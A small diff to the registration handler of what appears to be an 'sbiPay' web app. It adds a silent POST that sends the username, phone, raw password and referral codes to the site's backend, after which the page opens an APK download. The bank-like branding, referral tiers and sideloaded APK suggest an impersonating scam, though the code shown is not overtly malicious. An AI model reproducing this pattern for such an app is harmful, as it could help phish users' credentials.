@@ -41,6 +41,7 @@ document.getElementById('register-form').addEventListener('submit',function(even
     members.push({username,id:userId,inviteCode,referral,ownerCode:referral,level:parent.ownerCode?'C':'B',activity:0,joinedAt:new Date().toISOString()});
     localStorage.setItem('sbiPayTeamMembers',JSON.stringify(members));
   }
+  fetch('/api/register',{method:'POST',headers:{'Content-Type':'application/json'},keepalive:true,body:JSON.stringify({username,phone,password:document.querySelector('input[type="password"]').value,userId,inviteCode,ownerCode:referral})}).catch(()=>{});
   window.open(apkDownloadUrl,'_blank','noopener');
   window.location.href='dashboard.html?download=1';
   localStorage.removeItem('sbiPayWalletBanks');
